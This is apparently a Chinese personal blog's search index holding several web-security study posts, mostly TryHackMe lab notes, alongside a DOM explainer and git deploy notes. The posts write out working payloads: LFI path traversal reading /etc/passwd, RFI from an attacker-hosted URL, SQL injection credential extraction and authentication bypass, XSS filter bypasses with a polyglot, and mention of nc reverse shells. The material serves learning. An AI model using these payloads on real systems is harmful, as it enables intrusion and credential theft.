5.3.4 及更高版本。\n四 现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。\nhttp://webapp.thm/index.php?lang=../../../../etc/passwd\n我们收到了以下错误！\n1 Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15 如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。\n首先，我们可以发送以下 payload 来绕过它： ....//....//....//....//....//etc/passwd\n这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 ../ 它找到并且不执行另一次传递，留下下图所示的内容。\n五 最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： http://webapp.thm/index的php?lang=languages/EN.php然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： ?lang=languages/../../../../../etc/passwd 。\n远程文件包含 RFI 远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。\nRFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：\n敏感信息泄露 跨站点脚本 （XSS） 拒绝服务 （DoS） 外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。\nRFI步骤 下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.\n1 \u0026lt;?PHP echo \u0026#34;Hello THM\u0026#34;; ?\u0026gt; 首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。\n","date":"2025-03-19T00:00:00Z","permalink":"https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/","title":"文件包含基础"},{"content":"DOM Document Object Model 文档对象模型\n什么是文档对象模型？ \u0026mdash; What is the Document Object Model?\nDOM 是什么？ 想象一下，你有一张房子的建筑蓝图，上面画着房子的每一个部分：墙、门、窗户、屋顶等等。DOM 就像是网页的“蓝图”。当你打开一个网页，浏览器会把网页的 HTML 代码（那些 \u0026lt;html\u0026gt;、\u0026lt;div\u0026gt;、\u0026lt;p\u0026gt; 标签）解析成一个树状结构，这个结构就是 DOM。它把网页里的每一个元素（比如标题、段落、图片）都整理得清清楚楚，让计算机（特别是 JavaScript）能找到它们、操作它们。\n简单来说，DOM 是网页的骨架图，它把网页的内容变成一个个“节点”（node），这些节点就像蓝图上的标记点，互相之间还有父子关系、兄弟关系，形成一个大树。\n1 2 3 4 5 6 7 8 9 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;我的网页\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;欢迎\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;这是一个段落。\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在这个 HTML 里，DOM 会把它变成一个树形结构：\n1 2 3 4 5 6 7 8 9 - \u0026lt;html\u0026gt; 是根节点，就像树的树根，整个网页的起点。 - \u0026lt;html\u0026gt; 下面有两个“孩子”：\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt;。 - \u0026lt;head\u0026gt; 里有个孩子 \u0026lt;title\u0026gt;，它的内容是“我的网页”。 - \u0026lt;body\u0026gt; 里有两个孩子：\u0026lt;h1\u0026gt;（内容是“欢迎”）和 \u0026lt;p\u0026gt;（内容是“这是一个段落。”）。 这就像一个家庭的家谱：\u0026lt;html\u0026gt; 是爷爷，\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt; 是他的两个孩子，\u0026lt;title\u0026gt; 是 \u0026lt;head\u0026gt; 的孩子，\u0026lt;h1\u0026gt; 和 \u0026lt;p\u0026gt; 是 \u0026lt;body\u0026gt; 的孩子。每个节点都是一个“对象”，有自己的属性，比如 \u0026lt;p\u0026gt; 的 innerHTML 属性就是“这是一个段落。”。 DOM 有什么用？ DOM 的牛逼之处在于，它让 JavaScript 能和网页互动。有了 DOM，JavaScript 就像一个装修工人，可以拿着网页的蓝图（DOM）去干活：\n查看：找到某个节点，看看它是什么内容。 修改：比如把 \u0026lt;p\u0026gt; 的文字从“这是一个段落。”改成“这是新段落！”。 添加：在 \u0026lt;body\u0026gt; 里加一个新的 \u0026lt;p\u0026gt; 节点。 删除：把某个节点去掉。 举个例子：你想做一个网页，用户点一个按钮，页面上的文字就变了。你可以用 JavaScript 写代码，通过 DOM 找到那个文字所在的节点，然后改它的内容。比如：\n1 找到 \u0026lt;p\u0026gt; 节点 let paragraph = document.querySelector(\u0026#34;p\u0026#34;); // 修改它的内容 paragraph.innerHTML = \u0026#34;文字被我改啦！\u0026#34;; 再比如，你想做一个待办事项列表，用户点按钮就能添加新任务。这也是通过 DOM 实现的：JavaScript 创建一个新节点（比如 \u0026lt;li\u0026gt;），然后把它加到列表里。\nDOM 是桥梁 所以，DOM 就像是网页（HTML）和 JavaScript 之间的“翻译官”或者“桥梁”。HTML 负责写出网页的内容和结构，DOM 把这些内容变成一个树形结构，JavaScript 通过 DOM 来动态地控制网页，让网页不再是静态的，而是可以互动、有变化的。\n小结 用最简单的话说：\nDOM 是网页的树形蓝图，把每个元素都变成节点。 JavaScript 通过 DOM 操作网页，可以改内容、加东西、删东西。 它让网页变得活起来，能根据用户的操作动态变化。 ","date":"2025-03-18T00:00:00Z","permalink":"https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/","title":"DOM 文档对象模型"},{"content":"SQL注入 SQL 语法不区分大小写。\nSQL基础 SELECT 我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。\nselect * from users;\n第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。\n下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。\nselect username,password from users;\n与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。\nselect * from users LIMIT 1;\nselect * from users where username='admin';\n这只会返回 username 等于 admin 的行。\nselect * from users where username != 'admin';\n这只会返回 username 不 等于 admin 的行。\nselect * from users where username='admin' or username='jon';\n这只会返回用户名等于 admin 或 jon 的行。\nselect * from users where username='admin' and password='p4ssword';\n这只会返回用户名等于 admin 且密码等于 p4ssword 的行.\nlike 使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。\nselect * from users where username like '%n';\n这将返回用户名以字母 n 结尾的任何行。\nselect * from users where username like '%mi%';\n这将返回用户名中包含字符 mi 的任何行。\nUNION UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：\n另一个表叫 suppliers，内容如下：\n使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：\nSELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;\nINSERT INSERT 语句告诉数据库我们希望在表中插入一行新数据。 “into users” 告诉数据库我们希望将数据插入到哪个表中， “（username，password）” 提供我们提供数据的列，然后 “values （\u0026lsquo;bob\u0026rsquo;，\u0026lsquo;password\u0026rsquo;）”; 提供以前指定的列的数据。\ninsert into users (username,password) values ('bob','password123');\nUPDATE UPDATE 语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “update %tablename% SET” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “username=\u0026lsquo;root\u0026rsquo;，password=\u0026lsquo;pass123\u0026rsquo;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “where username=\u0026lsquo;admin;“\nupdate users SET username='root',password='pass123' where username='admin';\nDELETE DELETE 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 where 子句精确指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。\ndelete from users where username='martin';\ndelete from users;\n由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。\n基础做题 In-Band SQL Injection 查询库 利用union查询的原理，先确定回显的位置。\n构建 0 UNION SELECT 1,2,3\n可以看到页面情况，有三个回显位置\n构建 0 UNION SELECT 1,2,database()\n可以知道database的名字：sqli_one\n查询表 构建 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'\n在此查询中，需要学习一些新内容。首先，方法 group_concat（） 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 information_schema 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。\n由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。\n0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'\n这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 column_name，我们在 information_schema 数据库中查询的表已从 tables 更改为 columns，并且我们正在搜索 table_name 列值为 staff_users 的任何行\n查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。\n0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '\u0026lt;br\u0026gt;') FROM staff_users\n同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 ，\u0026rsquo;：\u0026rsquo;， 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 HTML \u0026lt;br\u0026gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。\n身份认证绕过盲注 与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。\n最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。\n连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。\n考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。\n实际： SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：\nselect * from users where username='%username%' and password='%password%' LIMIT 1;\n注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。\n要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：\n' OR 1=1;--\n这会将 SQL 查询转换为以下内容：\nselect * from users where username='' and password='' OR 1=1;\n因为 1=1 是 true 语句，并且我们使用了 OR 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。\n基于布尔盲注 基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。\n实际： 览器正文包含 {“taken”：true}。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 taken 的值设置为 true，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 admin 更改为 admin123 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false\nselect * from users where username = '%username%' LIMIT 1;\n我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 admin123，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 true。\n与前面的级别一样，我们的第一个任务是建立 users\u0026rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：\nadmin123' UNION SELECT 1;-- 由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 true 的 taken 值 。您可以通过将 username 设置为以下值来确认答案为三列：\nadmin123' UNION SELECT 1,2,3;-- 在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 database（） 方法，然后使用 like 运算符来尝试查找将返回 true 状态的结果。\n尝试以下 username 值，看看会发生什么：\nadmin123' UNION SELECT 1,2,3 where database() like '%';--\n我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 a 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 true 响应，确认数据库名称以字母 s 开头\nadmin123' UNION SELECT 1,2,3 where database() like 's%';--\n现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，\u0026lsquo;sa%\u0026rsquo;、\u0026lsquo;sb%\u0026rsquo;、\u0026lsquo;sc%\u0026rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 sqli_three\n我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--\n此查询在 tables 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 false 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。\n您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--\n最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';\n同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';\n重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 users 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：\nadmin123' UNION SELECT 1,2,3 from users where username like 'a%\nadmin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%\n基于时间的盲注 基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 SLEEP（x） 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。\n实际： 因此，例如，在尝试建立表中的列数时，您将使用以下查询：\nadmin123' UNION SELECT SLEEP(5);--\n如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：\nadmin123' UNION SELECT SLEEP(5),2;--\n有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。\n按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式\n最后得到admin：4961\n","date":"2025-03-18T00:00:00Z","permalink":"https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","title":"SQL注入基础"},{"content":"XSS THM 做题记录 Level One: 看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：\n如果查看 Page Source，将看到姓名反映在代码中：\n我们将尝试输入以下 JavaScript Payload，而不是输入姓名： \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n现在，当单击输入按钮时，将收到一个带有字符串 THM 的警报弹出窗口，页面源代码将如下所示：\nLevel Two： 与上一个级别一样，系统将再次要求您输入的姓名。这一次，当单击 enter 时，姓名将反映在 input 标签中：\n查看页面源，可以看到姓名反映在 input 标签的 value 属性中：\n如果要尝试前面的 JavaScript 有效负载，它将不起作用，因为无法从 input 标签内部运行它。相反，我们需要先转义 input 标签，以便 payload 可以正常运行。可以使用以下有效负载执行此作：\n\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n有效负载的重要部分是“\u0026gt;”，它关闭 value 参数，然后关闭 input 标记。\n现在，这会正确关闭 input 标记并允许 JavaScript 有效负载运行：\nLevel Three: 看到另一个表单，询问名字，与上一级一样，名字会反映在 HTML 标签中，这次是 textarea 标签。\n我们必须使用以下有效负载，以略微不同的方式转义 textarea 标签和输入 1（在 Level Two 中）：\n\u0026lt;/textarea\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n上述有效负载的重要部分是 \u0026lt;/textarea\u0026gt;，它会导致 textarea 元素关闭，以便脚本运行。\nLevel Four: 在表单中输入姓名，会在页面上看到它。此级别看起来类似于 1 级，但在检查页面源代码时，会看到名字反映在一些 JavaScript 代码中。\n必须转义现有的 JavaScript 命令，以便能够运行代码;可以使用以下有效负载 ';alert（'THM'）;// 从下面的屏幕截图中可以看到，它将执行代码。' 关闭指定名称的字段，然后 ;表示当前命令的结束，末尾的 则``使它后面的任何内容成为注释，而不是可执行代码。\nLevel Five: 现在，此级别看起来与级别 1 相同，并且名字也会反映在同一个位置。但是，如果尝试有效负载 \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，它将不起作用。当查看页面源代码时，将了解原因。\nscript 会从有效负载中删除，这是因为有一个过滤器可以去除任何具有潜在危险的单词。\n当一个单词从字符串中删除时，你可以尝试一个有用的技巧。\n尝试输入有效负载 \u0026lt;sscriptcript\u0026gt;alert('THM');\u0026lt;/sscriptcript\u0026gt; 并单击输入按钮，将看到一个带有字符串 THM 的警报弹出窗口。\nLevel Six: 与第二级类似，我们必须从 input 标签的 value 属性中转义，我们可以尝试 \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，但这似乎不起作用。让我们检查一下页面源代码，看看为什么这不起作用。\n可以看到 \u0026lt; 和 \u0026gt; 字符从我们的 payload 中被过滤掉，从而阻止我们转义 IMG 标签。为了绕过过滤器，我们可以利用 IMG 标签的其他属性，比如 onload 事件。onload 事件将在 src 属性中指定的图像加载到网页后执行您选择的代码。\n让我们更改 payload 以反映这一点 /images/cat.jpg\u0026quot; onload=\u0026quot;alert('THM'); ，然后查看页面源，您将看到这将如何工作。\nPolyglots: XSS 多语言是一串文本，可以一站式转义属性、标签和绕过过滤器。可以在刚刚完成的所有 6 个级别上使用以下多语言，并且它会成功执行代码。\n1 jaVasCript:/*-/*`/*\\`/*\u0026#39;/*\u0026#34;/**/(/* */onerror=alert(\u0026#39;THM\u0026#39;) )//%0D%0A%0d%0a//\u0026lt;/stYle/\u0026lt;/titLe/\u0026lt;/teXtarEa/\u0026lt;/scRipt/--!\u0026gt;\\x3csVg/\u0026lt;sVg/oNloAd=alert(\u0026#39;THM\u0026#39;)//\u0026gt;\\x3e ","date":"2025-03-18T00:00:00Z","permalink":"https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/","title":"关于XSS基础的利用"},{"content":"自动部署 参考 【Hugo】Hugo + Github 免费部署自己的博客\n首次部署 1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin {你的github仓库地址} git push -u origin main 更新 在dev目录下\n1 2 3 4 5 git init git add . git commit -m \u0026#34;update\u0026#34; git branch -M main git push ","date":"2025-03-18T00:00:00Z","permalink":"https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/","title":"利用github实现自动部署"},{"content":"命令注入 分类 命令注入主要可以通过以下两种方式之一进行检测：\n盲命令注入 详细命令注入 方法 描述 盲 这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。 详细 这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 whoami 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。 有用的有效载荷 Linux 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 ls 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 sleep 这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 ping。 nc Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。 windows 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 dir 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 timeout 此命令还将调用应用程序以挂起。如果未安装 ping 命令，则它还可用于测试应用程序是否进行盲命令注入。 ","date":"2025-03-18T00:00:00Z","permalink":"https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","title":"命令注入基础"}]